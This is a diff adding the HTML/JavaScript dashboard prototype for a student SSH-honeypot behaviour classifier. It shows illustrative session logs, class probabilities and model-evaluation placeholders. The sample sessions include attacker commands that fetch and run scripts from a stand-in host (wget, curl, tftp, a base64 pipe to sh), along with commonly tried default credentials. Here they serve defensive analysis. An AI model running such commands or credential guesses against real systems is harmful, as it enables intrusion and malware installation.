@@ -1,0 +1,232 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Honeypot Insight – Dashboard Prototype</title>
+<meta name="description" content="Prototype of the dashboard for an AI-assisted attacker behaviour classification system for SSH honeypot logs (UNITEN FYP). Sample data only.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --navy:#032145; --ink:#14243A; --muted:#4A5B70; --soft:#5C6B7E; --line:#DCE4EE; --line2:#E3E9F1;
+    --bg:#F3F6FA; --card:#FFFFFF; --blue:#0091E1;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:Inter,system-ui,sans-serif}
+  a{color:#005A8F} a:hover{color:var(--navy)}
+  button{font-family:inherit}
+  button:focus-visible,a:focus-visible{outline:3px solid #00D0FF;outline-offset:2px}
+  .mono{font-family:"JetBrains Mono",ui-monospace,monospace}
+  .app{min-height:100vh;display:flex;flex-wrap:wrap}
+  nav{flex:1 1 220px;max-width:100%;background:var(--navy);color:#fff;padding:24px 16px;display:flex;flex-direction:column;gap:20px}
+  .brand{display:flex;align-items:center;gap:10px;padding:0 8px}
+  .brand b{font-size:15px;display:block} .brand small{font-size:12px;color:#9FD3F3}
+  .tabs{display:flex;flex-direction:column;gap:4px}
+  .tab{text-align:left;border:0;border-radius:8px;padding:0 12px;min-height:44px;font-size:14px;cursor:pointer;background:transparent;color:#CFE6F7;font-weight:500}
+  .tab[aria-current="page"]{background:var(--blue);color:#fff;font-weight:600}
+  .proto{margin-top:auto;background:#0A2E57;border-radius:10px;padding:12px;font-size:12px;line-height:1.5;color:#CFE6F7}
+  .proto strong{color:#fff}
+  main{flex:999 1 560px;min-width:0;padding:28px clamp(16px,3vw,40px);display:flex;flex-direction:column;gap:20px}
+  header{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:12px}
+  h1{margin:0;font-size:26px;color:var(--navy)} header p{margin:4px 0 0;font-size:14px;color:var(--muted)}
+  .pill{display:inline-flex;align-items:center;gap:6px;border-radius:999px;padding:6px 12px;font-size:13px}
+  .live{background:#fff;border:1px solid #D5DEE9;color:#1E5E3A}
+  .sample{background:#FFF4D6;border:1px solid #F0D27A;font-weight:600;color:#6B4E00}
+  .card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px;display:flex;flex-direction:column;gap:14px;min-width:0}
+  h2{margin:0;font-size:16px;color:var(--navy)}
+  .grid-auto{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px}
+  .row{display:flex;flex-wrap:wrap;gap:16px}
+  .kpi span:first-child{font-size:13px;color:var(--muted);font-weight:500}
+  .kpi .v{font-size:30px;font-weight:700;color:var(--navy)}
+  .kpi small{font-size:12px;color:var(--soft)}
+  .badge{display:inline-block;border-radius:999px;padding:4px 10px;font-size:12px;font-weight:600;white-space:nowrap}
+  .recon{background:#E3F1FB;color:#00557F} .brute{background:#EEEAFF;color:#4627C4} .payload{background:#FFEAE3;color:#A8340F}
+  .sess{display:flex;flex-wrap:wrap;align-items:center;gap:12px;text-align:left;background:#F7F9FC;border:1px solid var(--line2);border-radius:10px;padding:12px 14px;cursor:pointer;min-height:48px;color:var(--ink);width:100%}
+  .sess:hover{border-color:#B9C8DA}
+  .bar{height:10px;background:#EEF2F7;border-radius:999px;overflow:hidden} .bar i{display:block;height:100%;border-radius:999px}
+  .link{background:none;border:0;padding:10px 4px;font-size:13px;font-weight:600;color:#005A8F;cursor:pointer}
+  .filters{display:flex;flex-wrap:wrap;gap:8px}
+  .chip{border-radius:999px;padding:0 16px;min-height:44px;font-size:13px;font-weight:600;cursor:pointer;background:#fff;color:var(--navy);border:1px solid #C7D3E1}
+  .chip[aria-pressed="true"]{background:var(--navy);color:#fff;border-color:var(--navy)}
+  .tablebox{overflow-x:auto;border:1px solid var(--line2);border-radius:10px}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th{background:var(--bg);text-align:left;color:#34465C;font-weight:600;padding:12px 14px}
+  td{padding:10px 14px;border-top:1px solid var(--line2)}
+  .btn{background:var(--navy);color:#fff;border:0;border-radius:8px;padding:0 14px;min-height:40px;font-size:13px;font-weight:600;cursor:pointer}
+  .btn-ghost{align-self:flex-start;background:none;border:1px solid #C7D3E1;border-radius:8px;padding:0 14px;min-height:44px;font-size:13px;font-weight:600;color:var(--navy);cursor:pointer}
+  .note{margin:0;font-size:12px;color:var(--soft);line-height:1.5}
+  dl{margin:0;display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:10px 16px;font-size:13px}
+  dt{color:var(--soft)} dd{margin:2px 0 0}
+  .term{background:#0B1B2E;border-radius:10px;padding:16px;display:flex;flex-direction:column;gap:6px;overflow-x:auto}
+  .term div{display:flex;gap:14px;font-size:13px;line-height:1.6;white-space:pre}
+  .t{color:#8FA6BF} .cmd{color:#E6EDF5} .auth{color:#7FE0A8} .fail{color:#FFB59E} .meta{color:#8FA6BF}
+  .tag{background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:6px 10px;font-size:12px;color:#34465C}
+  .tags{display:flex;flex-wrap:wrap;gap:8px}
+  .chart{display:grid;grid-template-columns:repeat(7,minmax(56px,1fr));gap:14px;align-items:end;height:260px;min-width:480px;border-bottom:1px solid #C7D3E1;padding:0 4px}
+  .col{display:flex;flex-direction:column;justify-content:flex-end;gap:2px;height:100%}
+  .col span{font-size:12px;color:var(--muted);text-align:center;margin-bottom:4px}
+  .col i{display:block;border-radius:4px}
+  .xlab{display:grid;grid-template-columns:repeat(7,minmax(56px,1fr));gap:14px;min-width:480px;padding:8px 4px 0;font-size:12px;color:var(--muted);text-align:center}
+  .legend{display:flex;flex-wrap:wrap;gap:14px;font-size:12px;color:#34465C}
+  .legend span{display:inline-flex;align-items:center;gap:6px} .sw{width:12px;height:12px;border-radius:3px;display:inline-block}
+  .list div{display:flex;justify-content:space-between;gap:12px;font-size:13px;border-bottom:1px solid #EEF2F7;padding-bottom:6px}
+  .warn{background:#FFF4D6;border:1px solid #F0D27A;border-radius:14px;padding:16px 20px;font-size:14px;line-height:1.55;color:#4D3800}
+  footer{margin-top:auto;padding-top:8px;font-size:12px;color:var(--soft);display:flex;flex-wrap:wrap;gap:6px 16px}
+  .sr{position:absolute;left:-9999px}
+</style>
+</head>
+<body>
+<div class="app">
+  <nav aria-label="Dashboard pages">
+    <div class="brand">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#00D0FF" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3l8 3v6c0 4.5-3.4 8.3-8 9-4.6-.7-8-4.5-8-9V6l8-3z"/><path d="M8.5 12l2.5 2.5 4.5-5"/></svg>
+      <div><b>Honeypot Insight</b><small>SSH behaviour classifier</small></div>
+    </div>
+    <div class="tabs" id="tabs"></div>
+    <div class="proto"><strong>Prototype</strong><br>Planned design for FYP 2. All numbers and sessions are illustrative sample data, not real results.</div>
+  </nav>
+  <main>
+    <header>
+      <div><h1 id="title"></h1><p id="sub"></p></div>
+      <div style="display:flex;flex-wrap:wrap;gap:8px">
+        <span class="pill live"><svg width="10" height="10" aria-hidden="true"><circle cx="5" cy="5" r="5" fill="#1F9D55"/></svg>Last update 1 min ago</span>
+        <span class="pill sample">Sample data</span>
+      </div>
+    </header>
+    <div id="view"></div>
+    <footer>
+      <span>Clarice Dara · UNITEN Final Year Project · Prototype, sample data only</span>
+      <a href="https://github.com/claaricedara/ssh-honeypot-classifier">github.com/claaricedara/ssh-honeypot-classifier</a>
+    </footer>
+  </main>
+</div>
+
+<script>
+const C = {
+  recon:   {label:'Reconnaissance',           bar:'#0091E1'},
+  brute:   {label:'Credential Brute-Forcing', bar:'#6D4AFF'},
+  payload: {label:'Payload Deployment',       bar:'#FF5224'}
+};
+const KEYS = ['recon','brute','payload'];
+const S = [
+  {id:'S-1047',ip:'203.0.113.24',time:'24 Nov, 14:52',dur:'42 s',logins:1,k:'recon',client:'SSH-2.0-Go',sum:'System and hardware checks',p:[.86,.06,.08],rule:'Only discovery commands (uname, /proc/cpuinfo, whoami); no download or execution.',
+   ev:[['00:00','login success  root / admin','auth'],['00:03','$ uname -a','cmd'],['00:07','$ cat /proc/cpuinfo | grep name','cmd'],['00:12','$ whoami','cmd'],['00:19','$ ls -la /home','cmd'],['00:42','session closed','meta']]},
+  {id:'S-1046',ip:'198.51.100.7',time:'24 Nov, 14:49',dur:'18 s',logins:14,k:'brute',client:'SSH-2.0-libssh',sum:'14 password attempts, no commands',p:[.03,.94,.03],rule:'14 failed logins in one session (rule: 3 or more).',
+   ev:[['00:00','login failed  root / 123456','fail'],['00:01','login failed  root / password','fail'],['00:02','login failed  admin / admin','fail'],['00:03','… 10 more failed attempts','meta'],['00:17','login failed  ubuntu / ubuntu','fail'],['00:18','session closed','meta']]},
+  {id:'S-1043',ip:'192.0.2.150',time:'24 Nov, 14:41',dur:'1 m 36 s',logins:2,k:'payload',client:'SSH-2.0-OpenSSH_8.2',sum:'Downloads and runs a script',p:[.07,.04,.89],rule:'Download followed by chmod +x and execution in /tmp.',
+   ev:[['00:00','login failed  root / root','fail'],['00:02','login success  root / 1234','auth'],['00:06','$ cd /tmp','cmd'],['00:09','$ wget http://payload.example/x.sh','cmd'],['00:15','$ chmod +x x.sh; ./x.sh','cmd'],['00:21','$ echo Y3JvbnRhYiAtbA== | base64 -d | sh','cmd'],['00:21','  decoded: crontab -l','meta'],['01:36','session closed','meta']]},
+  {id:'S-1041',ip:'203.0.113.88',time:'24 Nov, 14:33',dur:'9 s',logins:6,k:'brute',client:'SSH-2.0-PUTTY',sum:'6 password attempts',p:[.05,.9,.05],rule:'6 failed logins in one session (rule: 3 or more).',
+   ev:[['00:00','login failed  pi / raspberry','fail'],['00:02','login failed  root / toor','fail'],['00:03','… 4 more failed attempts','meta'],['00:09','session closed','meta']]},
+  {id:'S-1038',ip:'198.51.100.42',time:'24 Nov, 14:20',dur:'27 s',logins:1,k:'recon',client:'SSH-2.0-Go',sum:'Memory, CPU and OS checks',p:[.81,.05,.14],rule:'Discovery commands only (free, nproc, os-release).',
+   ev:[['00:00','login success  root / root','auth'],['00:04','$ free -m','cmd'],['00:08','$ nproc','cmd'],['00:13','$ cat /etc/os-release','cmd'],['00:27','session closed','meta']]},
+  {id:'S-1036',ip:'192.0.2.9',time:'24 Nov, 14:11',dur:'54 s',logins:1,k:'payload',client:'SSH-2.0-libssh',sum:'Failed download attempt',p:[.18,.03,.79],rule:'Download attempt (failed) counts as Payload Deployment.',
+   ev:[['00:00','login success  admin / admin','auth'],['00:05','$ curl -O http://payload.example/bot','cmd'],['00:06','  curl: could not resolve host','meta'],['00:11','$ busybox tftp -g -r bot 192.0.2.1','cmd'],['00:54','session closed','meta']]},
+  {id:'S-1033',ip:'203.0.113.5',time:'24 Nov, 13:58',dur:'15 s',logins:1,k:'recon',client:'SSH-2.0-Go',sum:'User and network checks',p:[.77,.12,.11],rule:'Discovery commands only (w, ifconfig).',
+   ev:[['00:00','login success  user / user','auth'],['00:04','$ w','cmd'],['00:09','$ ifconfig','cmd'],['00:15','session closed','meta']]},
+  {id:'S-1030',ip:'198.51.100.19',time:'24 Nov, 13:47',dur:'6 s',logins:3,k:'brute',client:'SSH-2.0-libssh',sum:'3 password attempts',p:[.09,.84,.07],rule:'3 failed logins in one session (rule: 3 or more).',
+   ev:[['00:00','login failed  oracle / oracle','fail'],['00:03','login failed  test / test','fail'],['00:05','login failed  git / git','fail'],['00:06','session closed','meta']]}
+];
+const TABS = [['overview','Overview','Live picture of attacker sessions captured by the Cowrie honeypot'],
+  ['explorer','Session Explorer','Every classified session; filter by behaviour class'],
+  ['detail','Session Detail','What the attacker did, and why the model chose this class'],
+  ['trends','Attack Trends','How behaviour changes over time'],
+  ['model','Model Info','How sessions are classified and how the models are evaluated']];
+const MIX = {recon:92, brute:97, payload:25}, TOTAL = 214;
+const DAYS = [['18 Nov',61,70,14],['19 Nov',74,88,19],['20 Nov',58,64,11],['21 Nov',83,96,22],['22 Nov',70,79,17],['23 Nov',66,91,20],['24 Nov',92,97,25]];
+
+let state = {tab:'overview', filter:'all', selected:'S-1043'};
+const esc = s => String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const badge = k => `<span class="badge ${k}">${C[k].label}</span>`;
+const cmds = s => s.ev.filter(e => e[2]==='cmd').length;
+function set(p){ Object.assign(state,p); render(); }
+
+function overview(){
+  const kpi = (l,v,n,col) => `<div class="card kpi" style="gap:6px"><span>${l}</span><span class="v" style="color:${col||'var(--navy)'}">${v}</span><small>${n}</small></div>`;
+  return `<section style="display:flex;flex-direction:column;gap:20px">
+    <div class="grid-auto">${kpi('Sessions today',TOTAL,'sample figure')}${kpi('Unique source IPs',131,'sample figure')}${kpi('Payload attempts',MIX.payload,'highest-risk class','#A8340F')}${kpi('Dashboard delay','~1–2 min','target after a session closes','#00557F')}</div>
+    <div class="row">
+      <div class="card" style="flex:2 1 420px">
+        <div style="display:flex;justify-content:space-between;align-items:baseline;flex-wrap:wrap;gap:8px"><h2>Latest classified sessions</h2><button class="link" data-tab="explorer">Open Session Explorer →</button></div>
+        <div style="display:flex;flex-direction:column;gap:8px">${S.slice(0,5).map(s=>`<button class="sess" data-open="${s.id}"><span class="mono" style="font-size:13px;min-width:120px">${esc(s.ip)}</span>${badge(s.k)}<span style="font-size:13px;color:var(--muted);flex:1 1 140px">${esc(s.sum)}</span><span style="font-size:12px;color:var(--soft)">${s.time}</span></button>`).join('')}</div>
+      </div>
+      <div class="card" style="flex:1 1 260px">
+        <h2>Today by class</h2>
+        ${KEYS.map(k=>{const pct=Math.round(MIX[k]/TOTAL*100);return `<div style="display:flex;flex-direction:column;gap:6px"><div style="display:flex;justify-content:space-between;font-size:13px"><b style="font-weight:600">${C[k].label}</b><span style="color:var(--muted)">${MIX[k]} sessions · ${pct}%</span></div><div class="bar"><i style="width:${pct}%;background:${C[k].bar}"></i></div></div>`}).join('')}
+        <p class="note">Classes are project-defined; labelling rules are informed by MITRE ATT&amp;CK.</p>
+      </div>
+    </div></section>`;
+}
+function explorer(){
+  const rows = S.filter(s => state.filter==='all' || s.k===state.filter);
+  const chips = [['all','All classes'],...KEYS.map(k=>[k,C[k].label])].map(f=>`<button class="chip" data-filter="${f[0]}" aria-pressed="${state.filter===f[0]}">${f[1]}</button>`).join('');
+  return `<section class="card"><div class="filters" role="group" aria-label="Filter by class">${chips}</div>
+    <div class="tablebox"><table style="min-width:720px"><thead><tr><th>Session</th><th>Source IP</th><th>Start</th><th>Duration</th><th>Logins</th><th>Commands</th><th>Predicted class</th><th><span class="sr">Action</span></th></tr></thead><tbody>
+    ${rows.map(s=>`<tr><td class="mono">${s.id}</td><td class="mono">${esc(s.ip)}</td><td>${s.time}</td><td>${s.dur}</td><td>${s.logins}</td><td>${cmds(s)}</td><td>${badge(s.k)}</td><td style="padding:6px 14px"><button class="btn" data-open="${s.id}">View</button></td></tr>`).join('')}
+    </tbody></table></div><p class="note">Showing ${rows.length} sample sessions. IP addresses are from reserved documentation ranges.</p></section>`;
+}
+function detail(){
+  const s = S.find(x=>x.id===state.selected) || S[2];
+  const feats = ['duration '+s.dur, s.logins+' login attempts', cmds(s)+' commands','char 3–5-gram TF-IDF','client '+s.client];
+  return `<section class="row">
+    <div style="flex:1 1 280px;min-width:0;display:flex;flex-direction:column;gap:16px">
+      <div class="card" style="gap:12px"><div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap"><span class="mono" style="font-size:15px;font-weight:500">${s.id}</span>${badge(s.k)}</div>
+        <dl><div><dt>Source IP</dt><dd class="mono">${esc(s.ip)}</dd></div><div><dt>Start</dt><dd>${s.time}</dd></div><div><dt>Duration</dt><dd>${s.dur}</dd></div><div><dt>Login attempts</dt><dd>${s.logins}</dd></div><div><dt>Client</dt><dd class="mono" style="font-size:12px">${esc(s.client)}</dd></div><div><dt>Commands</dt><dd>${cmds(s)}</dd></div></dl></div>
+      <div class="card" style="gap:12px"><h2>Why this class</h2>
+        ${KEYS.map((k,i)=>{const pct=Math.round(s.p[i]*100);return `<div style="display:flex;flex-direction:column;gap:4px"><div style="display:flex;justify-content:space-between;font-size:13px"><span>${C[k].label}</span><span style="color:var(--muted)">${pct}%</span></div><div class="bar" style="height:8px"><i style="width:${pct}%;background:${C[k].bar}"></i></div></div>`}).join('')}
+        <p style="margin:0;font-size:13px;line-height:1.55;color:#34465C"><strong>Rule match:</strong> ${esc(s.rule)}</p></div>
+    </div>
+    <div class="card" style="flex:2 1 420px;gap:12px"><h2>Session timeline</h2>
+      <div class="term mono">${s.ev.map(e=>`<div><span class="t">${e[0]}</span><span class="${e[2]}">${esc(e[1])}</span></div>`).join('')}</div>
+      <p class="note">Attacker input is shown as escaped text only. Base64 payloads are decoded for display, never executed.</p>
+      <div class="tags">${feats.map(f=>`<span class="tag">${esc(f)}</span>`).join('')}</div>
+      <button class="btn-ghost" data-tab="explorer">← Back to sessions</button>
+    </div></section>`;
+}
+function trends(){
+  const max = Math.max(...DAYS.map(d=>d[1]+d[2]+d[3]));
+  const h = v => Math.round(v/max*210);
+  const list = (title, rows) => `<div class="card" style="gap:10px"><h2>${title}</h2><div class="list" style="display:flex;flex-direction:column;gap:8px">${rows.map(r=>`<div><span class="mono">${r[0]}</span><span style="color:var(--muted)">${r[1]}</span></div>`).join('')}</div></div>`;
+  return `<section style="display:flex;flex-direction:column;gap:16px">
+    <div class="card"><div style="display:flex;flex-wrap:wrap;justify-content:space-between;gap:10px;align-items:baseline"><h2>Sessions per day, last 7 days</h2>
+      <div class="legend">${KEYS.map(k=>`<span><i class="sw" style="background:${C[k].bar}"></i>${C[k].label}</span>`).join('')}</div></div>
+      <div style="overflow-x:auto"><div class="chart" role="img" aria-label="Stacked bar chart of sample sessions per day by class over seven days">
+        ${DAYS.map(d=>`<div class="col"><span>${d[1]+d[2]+d[3]}</span><i style="height:${h(d[3])}px;background:${C.payload.bar}"></i><i style="height:${h(d[2])}px;background:${C.brute.bar}"></i><i style="height:${h(d[1])}px;background:${C.recon.bar}"></i></div>`).join('')}
+      </div><div class="xlab">${DAYS.map(d=>`<span>${d[0]}</span>`).join('')}</div></div></div>
+    <div class="grid-auto">${list('Most common commands',[['uname -a',148],['cat /proc/cpuinfo',121],['whoami',97],['cd /tmp',41],['wget …',23]])}${list('Most tried usernames',[['root',1204],['admin',388],['ubuntu',156],['test',102],['pi',77]])}</div>
+  </section>`;
+}
+function model(){
+  const models = ['Labelling rules only (baseline)','Random Forest','XGBoost'];
+  const info = {recon:'Looking around the system: listing files, checking users, hardware or network, with no download or execution.',
+    brute:'3 or more login attempts in a session, or 3 or more sessions from one IP within an hour.',
+    payload:'Trying to download, install or run something, including failed attempts.'};
+  const feats = ['Session duration','Login attempts','Failed vs successful logins','Command count','Download / execute flags','Decoded Base64 content','SSH client version','Character 3–5-gram TF-IDF of commands'];
+  return `<section style="display:flex;flex-direction:column;gap:16px">
+    <div class="warn"><strong>No trained results yet.</strong> Models are trained offline in FYP 2. This page will show the comparison once evaluation is done.</div>
+    <div class="card" style="gap:12px"><h2>Model comparison (planned)</h2>
+      <div class="tablebox"><table style="min-width:560px"><thead><tr><th>Model</th><th>Macro-F1</th><th>MCC</th><th>Recon recall</th><th>Brute-force recall</th><th>Payload recall</th></tr></thead><tbody>
+      ${models.map(m=>`<tr><td style="font-weight:600">${m}</td>${'<td style="color:var(--soft)">pending</td>'.repeat(5)}</tr>`).join('')}
+      </tbody></table></div><p class="note">Time-based 80/20 split. The chosen model must beat the labelling rules alone.</p></div>
+    <div class="grid-auto">${KEYS.map(k=>`<div class="card" style="gap:8px;padding:18px">${badge(k)}<p style="margin:0;font-size:13px;line-height:1.55;color:#34465C">${info[k]}</p></div>`).join('')}</div>
+    <div class="card" style="gap:10px"><h2>Features used</h2><div class="tags">${feats.map(f=>`<span class="tag">${f}</span>`).join('')}</div></div>
+  </section>`;
+}
+const VIEWS = {overview, explorer, detail, trends, model};
+function render(){
+  const t = TABS.find(x=>x[0]===state.tab);
+  document.getElementById('tabs').innerHTML = TABS.map(x=>`<button class="tab" data-tab="${x[0]}" aria-current="${x[0]===state.tab?'page':'false'}">${x[1]}</button>`).join('');
+  document.getElementById('title').textContent = t[1];
+  document.getElementById('sub').textContent = t[2];
+  document.getElementById('view').innerHTML = VIEWS[state.tab]();
+}
+document.addEventListener('click', e => {
+  const b = e.target.closest('button'); if(!b) return;
+  if(b.dataset.tab) set({tab:b.dataset.tab});
+  else if(b.dataset.open) set({tab:'detail', selected:b.dataset.open});
+  else if(b.dataset.filter) set({filter:b.dataset.filter});
+});
+render();
+</script>
+</body>
+</html>
